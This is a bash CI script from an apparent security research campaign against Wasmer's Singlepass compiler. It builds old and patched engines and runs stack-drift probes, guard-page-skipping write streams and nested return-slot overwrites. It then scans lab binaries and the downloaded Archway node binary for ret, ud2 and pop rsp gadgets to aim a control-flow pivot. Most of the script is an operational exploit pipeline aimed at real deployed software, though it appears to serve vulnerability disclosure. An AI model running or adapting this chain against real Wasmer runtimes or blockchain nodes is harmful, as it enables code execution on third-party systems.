#!/usr/bin/env bash
# CWA-2026-006 wasmer-level campaign (runs on GitHub Actions).
#  1. builds Singlepass 4.2.2 (chain-exact) + Singlepass 7.4.2 (patched) + Cranelift 7.4.2 (oracle)
#  2. R1 static-memory sentinel patterns
#  3. P1 rsp-drift probe + full variant sweep (Hexens WASMageddon shape)
set -uo pipefail
HERE="$(cd "$(dirname "$0")" && pwd)"        # .../archway-wasmer-lab/wasmer-lab
ROOT="$(cd "$HERE/.." && pwd)"               # .../archway-wasmer-lab
OUT="$ROOT/ci-out"
mkdir -p "$OUT"
cd "$HERE"

echo "=== [1/7] build labs (this is the heavy step) ==="
for lab in lab-422-sp lab-742-sp lab-742-cl; do
  echo "--- build $lab"
  mkdir -p "$lab/src"
  cp common/main.rs "$lab/src/main.rs"
  (cd "$lab" && cargo build --release -j 2 2>&1 | tail -30) || { echo "BUILD FAILED: $lab"; exit 1; }
  echo "built $lab"
done

echo "=== [2/7] R1 static-memory sentinel patterns ==="
for lab in lab-422-sp lab-742-sp lab-742-cl; do
  echo "--- $lab patterns"
  (timeout 120 "./$lab/target/release/$lab" patterns 2>&1 | tee "$OUT/patterns-$lab.txt") || echo "patterns run failed/crashed ($?)" | tee -a "$OUT/patterns-$lab.txt"
done

echo "=== [3/7] P1 named patterns (regression) ==="
for lab in lab-422-sp lab-742-sp; do
  for pat in patterns/p0_control.wat patterns/p1a_else_drift.wat patterns/p1b_else_drift.wat; do
    if timeout 300 "./$lab/target/release/$lab" drift "$pat" 10000 >>"$OUT/drift-$lab.jsonl" 2>&1; then
      tail -1 "$OUT/drift-$lab.jsonl"
    else
      rc=$?
      echo "{\"pattern\":\"$pat\",\"iters\":10000,\"result\":\"CRASH/exit:$rc\"}" >>"$OUT/drift-$lab.jsonl"
    fi
  done
done

echo "=== [4/7] P1 variant sweep (96 shapes x 2 engines) ==="
python3 gen_p1_variants.py --out "$OUT/p1variants" | tee "$OUT/sweep.log"
for lab in lab-422-sp lab-742-sp; do
  : > "$OUT/drift-sweep-$lab.jsonl"
  for pat in "$OUT"/p1variants/*.wat; do
    if timeout 120 "./$lab/target/release/$lab" drift "$pat" 5000 >>"$OUT/drift-sweep-$lab.jsonl" 2>&1; then :; else
      echo "{\"pattern\":\"$pat\",\"result\":\"CRASH/exit:$?\"}" >>"$OUT/drift-sweep-$lab.jsonl"
    fi
  done
  echo "--- $lab: variants with NONZERO drift ---" | tee -a "$OUT/sweep.log"
  grep -v '"drift":0' "$OUT/drift-sweep-$lab.jsonl" | head -80 | tee -a "$OUT/sweep.log"
  echo "--- $lab: total variants ---" | tee -a "$OUT/sweep.log"
  wc -l < "$OUT/drift-sweep-$lab.jsonl" | tee -a "$OUT/sweep.log"
done

echo "=== [5/7] high-iteration overflow probes (rsp probe is blind: host calls run on_host_stack) ==="
SEL="v_l6_extend_add_r1 v_l8_extend_add_r1 v_l12_extend_add_r1 v_l16_extend_add_r1 v_l24_extend_add_r1 v_l6_load_add_r1 v_l12_load_add_r1 v_l6_extend_extend_r1 v_l12_extend_extend_r1 v_l16_extend_extend_r1"
for lab in lab-422-sp lab-742-sp; do
  : > "$OUT/overflow-$lab.jsonl"
  for v in $SEL; do
    pat="$OUT/p1variants/$v.wat"
    [ -f "$pat" ] || continue
    for iters in 300000 2000000; do
      if timeout 300 "./$lab/target/release/$lab" drift "$pat" "$iters" >>"$OUT/overflow-$lab.jsonl" 2>&1; then
        tail -1 "$OUT/overflow-$lab.jsonl"
      else
        rc=$?
        echo "{\"pattern\":\"$v\",\"iters\":$iters,\"result\":\"CRASH/exit:$rc\"}" >>"$OUT/overflow-$lab.jsonl"
      fi
    done
  done
  echo "--- $lab: overflow outcomes (non-ok only) ---" | tee -a "$OUT/sweep.log"
  grep -v '"result":"ok"' "$OUT/overflow-$lab.jsonl" | head -40 | tee -a "$OUT/sweep.log"
done

echo "=== [6/7] E1 write-stream (dense) + E3 guard-jump (sparse) ==="
run_writestream() {
  local lab="$1" pat="$2" iters="$3" stride="$4" tag="$5"
  local warm="${6:-}" warmn="${7:-0}"
  timeout 900 "./$lab/target/release/$lab" writestream "$pat" "$iters" "$stride" "$warm" "$warmn" \
    >"$OUT/writestream-$lab-$tag.json" 2>"$OUT/writestream-$lab-$tag.scans"
  local rc=$?
  echo "--- $lab $tag (exit=$rc) ---" | tee -a "$OUT/sweep.log"
  echo "  last scans:" | tee -a "$OUT/sweep.log"
  grep -E "^(SCAN|CRASH)" "$OUT/writestream-$lab-$tag.scans" 2>/dev/null | tail -7 | sed 's/^/  /' | tee -a "$OUT/sweep.log"
  if [ "$rc" -eq 0 ]; then
    python3 - "$OUT/writestream-$lab-$tag.json" <<'PYEOF' | tee -a "$OUT/sweep.log"
import json, sys
try:
    d = json.load(open(sys.argv[1]))
except Exception as e:
    print("  summary parse error:", e); raise SystemExit
print("  result:", d.get("result"), "| calls:", d.get("calls"))
PYEOF
  else
    echo "  CRASH/exit=$rc (scan lines above show the crossing point)" | tee -a "$OUT/sweep.log"
  fi
}

# E1: dense stream (call every iteration) - regression on the confirmed result
python3 gen_writestream.py patterns/ws_drift.wat 1 | tee -a "$OUT/sweep.log"
run_writestream lab-422-sp patterns/ws_drift.wat 70000 8192 dense
run_writestream lab-742-sp patterns/ws_drift.wat 70000 8192 dense

# E3: sparse streams - write batches jump 16*K bytes per call. The guard occupies a
# ~256-iteration window around i~65536; a phase offset makes the schedule skip it.
# Warm-up (8 concurrent executions) grows the global stack pool so the trigger lands on
# a stack with a mapped neighbour below (otherwise the stream skips the guard into
# unmapped memory and the process faults - as seen in v3/v4).
for KO in "512 128" "1024 512" "2048 1024" "4096 2048" "8192 4096"; do
  set -- $KO; K=$1; OFF=$2
  python3 gen_writestream.py "patterns/ws_sparse_${K}_${OFF}.wat" "$K" "$OFF" | tee -a "$OUT/sweep.log"
  run_writestream lab-422-sp "patterns/ws_sparse_${K}_${OFF}.wat" 400000 1 "sparse${K}o${OFF}" "patterns/ws_drift.wat" 8
done
python3 gen_writestream.py patterns/ws_sparse_1024_512.wat 1024 512
run_writestream lab-742-sp patterns/ws_sparse_1024_512.wat 400000 1 "sparse1024o512" "patterns/ws_drift.wat" 8

echo "=== [7/7] E4/E5/E6 nested holder/trigger (overwrite + aimed pivot) ==="
run_nested() {
  local lab="$1" pat="$2" iters="$3" stride="$4" tag="$5"
  local warm="${6:-}" warmn="${7:-0}" holder_tag="${8:-7}" gadget="${9:-0x0}" marker="${10:-0x4242424242424242}"
  timeout 900 "./$lab/target/release/$lab" nested "$pat" "$iters" "$stride" "$warm" "$warmn" "$holder_tag" "$gadget" "$marker" \
    >"$OUT/nested-$lab-$tag.json" 2>"$OUT/nested-$lab-$tag.scans"
  local rc=$?
  echo "--- nested $lab $tag iters=$iters (exit=$rc) ---" | tee -a "$OUT/sweep.log"
  grep -E "^(NESTED|CRASH)" "$OUT/nested-$lab-$tag.scans" 2>/dev/null | tail -5 | sed 's/^/  /' | cut -c1-220 | tee -a "$OUT/sweep.log"
  if [ -s "$OUT/nested-$lab-$tag.json" ]; then
    sed 's/^/  /' "$OUT/nested-$lab-$tag.json" | tee -a "$OUT/sweep.log"
  fi
}
# E6: find a `ret` gadget in the lab binary (offset; PIE base resolved at runtime)
BIN="./lab-422-sp/target/release/lab-422-sp"
GADGET_OFF=$(objdump -d "$BIN" 2>/dev/null | grep -m1 -E '^\s*[0-9a-f]+:\s+c3\s' | awk '{print $1}' | tr -d ':')
if [ -z "$GADGET_OFF" ]; then GADGET_OFF="0"; echo "no ret gadget found" | tee -a "$OUT/sweep.log"; else echo "ret gadget offset: 0x$GADGET_OFF" | tee -a "$OUT/sweep.log"; fi
# E6 aimed-pivot sweep: live values are LOADED from linear memory (the host plants the
# gadget address + chain marker at 64+8k before the call). If a planted slot lands on the
# holder's return slot, execution jumps to the gadget (`ret`), pops the next planted qword,
# and jumps again -> fault address = the marker.
for R in $(seq 234 300); do
  OFF=$((512 - R))
  PAT="patterns/ws_load_r${R}.wat"
  python3 gen_writestream.py "$PAT" 512 "$OFF" load > /dev/null
  ITERS=$((65536 + R + 1))
  run_nested lab-422-sp "$PAT" "$ITERS" 1 "load_r${R}" "patterns/ws_drift.wat" 8 7 "0x$GADGET_OFF" 0x4242424242424242
done
run_nested lab-742-sp patterns/ws_load_r256.wat 65793 1 "load_r256" "patterns/ws_drift.wat" 8 7 "0x0" 0x4242424242424242

echo "=== [8/8] E6c: archwayd gadget analysis (non-PIE pivot targets) ==="
if [ ! -f /tmp/archwayd ]; then
  curl -sL --max-time 900 -o /tmp/archwayd "https://github.com/archway-network/archway/releases/download/v10.1.0/archwayd_linux_amd64" && echo "downloaded archwayd" || echo "download failed"
fi
if [ -s /tmp/archwayd ]; then
  file /tmp/archwayd | tee "$OUT/archwayd_info.txt"
  readelf -h /tmp/archwayd 2>/dev/null | grep -E "Type:|Entry point" | tee -a "$OUT/archwayd_info.txt"
  ls -la /tmp/archwayd | tee -a "$OUT/archwayd_info.txt"
  echo "--- gadget scan ---" | tee "$OUT/archwayd_gadgets.txt"
  timeout 900 objdump -d /tmp/archwayd > /tmp/archwayd.asm 2>/dev/null
  echo "asm lines: $(wc -l < /tmp/archwayd.asm 2>/dev/null || echo 0)" | tee -a "$OUT/archwayd_gadgets.txt"
  echo "ret gadgets (first 5):" | tee -a "$OUT/archwayd_gadgets.txt"
  grep -m5 -E '^\s*[0-9a-f]+:\s+c3\s+ret' /tmp/archwayd.asm | tee -a "$OUT/archwayd_gadgets.txt"
  echo "pop rsp gadgets:" | tee -a "$OUT/archwayd_gadgets.txt"
  grep -m5 -E '^\s*[0-9a-f]+:\s+5c\s+pop\s+rsp' /tmp/archwayd.asm | tee -a "$OUT/archwayd_gadgets.txt"
  echo "xchg rsp,rax / mov rsp,rax:" | tee -a "$OUT/archwayd_gadgets.txt"
  grep -m5 -E '^\s*[0-9a-f]+:\s+(48 94|48 89 c4)\s' /tmp/archwayd.asm | tee -a "$OUT/archwayd_gadgets.txt"
else
  echo "archwayd unavailable; skipping E6c" | tee "$OUT/archwayd_info.txt"
fi

# E6a-v3: aim the pivot at a `ud2` gadget — all planted slots hold the gadget address, so a
# return-slot overwrite transfers execution to it and SIGILLs with fault_addr == the gadget
# (direct proof of the aimed pivot).
UD2_OFF=$(objdump -d "$BIN" 2>/dev/null | grep -m1 -E '^\s*[0-9a-f]+:\s+0f 0b\s' | awk '{print $1}' | tr -d ':')
if [ -z "$UD2_OFF" ]; then echo "no ud2 gadget found" | tee -a "$OUT/sweep.log"; else echo "ud2 gadget offset: 0x$UD2_OFF" | tee -a "$OUT/sweep.log"; fi
if [ -n "$UD2_OFF" ]; then
  for R in $(seq 234 300); do
    OFF=$((512 - R))
    PAT="patterns/ws_load_r${R}.wat"
    [ -f "$PAT" ] || python3 gen_writestream.py "$PAT" 512 "$OFF" load > /dev/null
    ITERS=$((65536 + R + 1))
    run_nested lab-422-sp "$PAT" "$ITERS" 1 "ud2_r${R}" "patterns/ws_drift.wat" 8 7 "0x$UD2_OFF" 0x0
  done
fi

echo "=== results ==="
ls -la "$OUT"
exit 0
